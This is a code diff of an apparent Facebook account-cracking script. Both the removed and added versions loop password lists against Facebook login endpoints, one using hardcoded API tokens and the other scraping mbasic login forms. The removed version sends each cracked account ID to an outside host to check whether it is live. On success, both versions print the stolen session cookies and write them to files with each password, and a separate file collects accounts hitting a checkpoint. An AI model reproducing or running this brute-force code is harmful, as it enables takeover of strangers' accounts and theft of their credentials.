-        sys.stdout.write(f'\r\r{A}|CYBER-M5| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
-        try:
-                for pas in passlist:
-                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        random_seed = random.Random()
-                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
-                        headers = {'User-Agent':fex(),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str(random.randint(2e4, 4e4)),'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'WIFI','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}
-                        url = 'https://api.facebook.com/auth/login'
-                        po = requests.post(url,data=data,headers=headers).json()
-                        if 'session_key' in po:
-                                uid = po['uid']
-                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
-                                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={uid}").text
-                                if res == 'LIVE':
-                                	print(f'\r\r\x1b[38;5;46m|CYBER-OK| {uid} | {pas}');print(f'\r\r\033[1;37m|COOKIE🍪|-> {coki} ');open('/sdcard/CYBER-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');oks.append(uid);break
-                                if res == 'LOCK':
-                                	print(f'\r\r\033[1;31;40m|CYBER-LOCK| {uid} | {pas}');break
-                                elif 'www.facebook.com' in po['error']['message']:
-                                	print(f'\r\r\033[30;1m|CYBER-CP| {uid} | {pas}');open('/sdcard/CYBER-FILE-CP.txt','a').write(ids+'|'+pas+'\n');cps.append(ids);break
-                                else:continue
-                loop+=1
-        except:pass
+        for ps in pwx:
+            session = requests.Session()
+            sys.stdout.write(f'\r\r{A}|CYBER| {loop} {len(oks)}{G}|{A}{len(cps)} ');sys.stdout.flush()
+            pro = random.choice(ugen)
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {"authority": 'mbasic.facebook.com',
+            "method": 'GET',
+            "scheme": 'https',
+            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
+            "accept-encoding": 'gzip, deflate, br',
+            "accept-language": 'en-US,en;q=1',
+            'cache-control': 'no-cache, no-store, must-revalidate',
+            "referer": 'https://t.facebook.com/',
+            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
+            "sec-ch-ua-mobile": '?1',
+            "sec-ch-ua-platform": "Windows",
+            "sec-fetch-dest": 'document',
+            "sec-fetch-mode": 'navigate',
+            "sec-fetch-site": 'same-origin',
+            "sec-fetch-user": '?0',
+            "pragma": 'no-cache',
+            "priority": 'u=0',
+            'cross-origin-resource-policy': 'cross-origin',
+            "upgrade-insecure-requests": '1',
+            "user-agent": pro}
+            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print(f'\r\r\x1b[38;5;46m|CYBER-OK| '+uid+' | '+ps+'')
+                print(f'\033[1;36mᏟϴϴᏦᏆᎬ : \033[1;37m'+coki)
+                open('/sdcard/CYBER-OK.txt','a').write(uid+'|'+ps+'|'+coki+'\n')
+                oks.append(cid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[24:39]
+                print('\033[1;90m[CYBER-ᏟᏢ] '+uid+' | '+ps+'\033[1;97m')
+                open('/sdcard/CYBER-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(cid)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
 #──────────────{ END }──────────────#
 menu()
